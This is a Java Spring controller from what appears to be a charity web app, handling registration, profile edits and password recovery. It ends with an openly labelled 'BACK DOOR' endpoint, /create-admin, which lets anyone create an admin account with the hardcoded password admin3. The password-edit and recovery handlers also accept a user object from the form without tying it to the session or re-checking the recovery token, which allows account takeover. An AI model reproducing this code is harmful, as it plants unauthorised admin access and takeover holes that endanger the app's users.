package pl.coderslab.charity.controller;

import lombok.RequiredArgsConstructor;
import org.springframework.security.core.annotation.AuthenticationPrincipal;
import org.springframework.stereotype.Controller;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.util.WebUtils;
import pl.coderslab.charity.entity.Token;
import pl.coderslab.charity.entity.User;
import pl.coderslab.charity.service.*;
import pl.coderslab.charity.util.MessageTextUtil;
import pl.coderslab.charity.util.TokenUtil;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.validation.Valid;
import java.util.UUID;

@RequiredArgsConstructor
@Controller
public class UserController {

    private final UserService userService;
    private final TokenService tokenService;
    private final EmailService emailService;

    private final UserPasswordRecoveryService userPassRecoveryService;
    @GetMapping("/register")
    private String showRegisterForm(Model model){
        model.addAttribute("user", new User());
        return "register";
    }

    @PostMapping("/register")
    private String proceedRegisterForm(@Valid User user, BindingResult result, @RequestParam String password2){
        if(result.hasErrors() || !userService.verifyPasswordRepetition(user.getPassword(), password2) || userService.dataRepetitionFound(user)){
            return "register";
        }
        userService.saveNotRegisteredUser(user);
        return "user/register-mail-sent";
    }


    @GetMapping("/register/uuid/{token}")
    private String showRegisterConfirmation(@PathVariable String token){
        Token byToken = tokenService.findByToken(token);
        if(byToken!=null && byToken.getToken().equals(token)){
            User user = byToken.getUser();
            userService.register(user);
            return "register-success";

        }
        return "/error";
    }


    @GetMapping("/user/edit")
    private String showUserEditForm(@AuthenticationPrincipal CurrentUser currentUser, Model model){
        User user = userService.findByUserName(currentUser.getUsername());
        model.addAttribute("user", user);
        return "user/edit";
    }

    @PostMapping("/user/edit")
    private String proceedUserEditForm(User user){
        if(userService.dataRepetitionFound(user)){
            return "user/edit";
        }
        userService.save(user);
        return "redirect:/";
    }

    @GetMapping("/user/password/edit")
    private String showUserPasswordEditForm(@AuthenticationPrincipal CurrentUser currentUser, Model model){
        User user = userService.findByUserName(currentUser.getUsername());
        user.setPassword("");
        model.addAttribute("user", user);
        return "user/password-edit";
    }

    @PostMapping("/user/password/edit")
    private String proceedUserPasswordEditForm(User user, @RequestParam String password2){
        if (userService.verifyPasswordRepetition(user.getPassword(), password2)){
            userService.changePassword(user);
            return "redirect:/";
        }
        return "redirect:/user/password/edit";
    }

    @GetMapping("/password-recovery")
    public String showPasswordRecoveryForm(){
        return "password-recovery-mail";
    }

    @PostMapping("/password-recovery")
    public String processPasswordRecoveryForm(@RequestParam String email){
        User user = userService.findByEmail(email);
        if(user!=null){
            userPassRecoveryService.passwordRecover(user);
            return "user/pass-recovery-mail-sent";
        }
        return "user/unknown-mail";
    }

    @GetMapping("/password-recovery/uuid/{code}")
    public String showPasswordForm(Model model, @PathVariable String code){
        Token token = tokenService.findByToken(code);
        if(token!=null && token.getToken().equals(code)){
            model.addAttribute("user", token.getUser());
            return "user/recovery-password";
        }
        return "/error";
    }

    @PostMapping("/password-recovery/uuid/{code}")
    public String processPasswordForm(User user, @RequestParam String password2){
        if (!userService.verifyPasswordRepetition(user.getPassword(), password2)){
            return "user/recovery-password";
        }
        userPassRecoveryService.editPassword(user);
        return "password-restore-confirmed";
    }


   // BACK DOOR BACK DOOR BACK DOOR

    @GetMapping("/create-admin")
    @ResponseBody
    public String createUser() {
        User user = new User();
        user.setUsername("admin3");
        user.setPassword("admin3");
        user.setEmail("emzio@outlook.com");
        user.setLastname("admin3");
        user.setName("admin3");

        userService.saveAdmin(user);
        return "admin";
    }

}
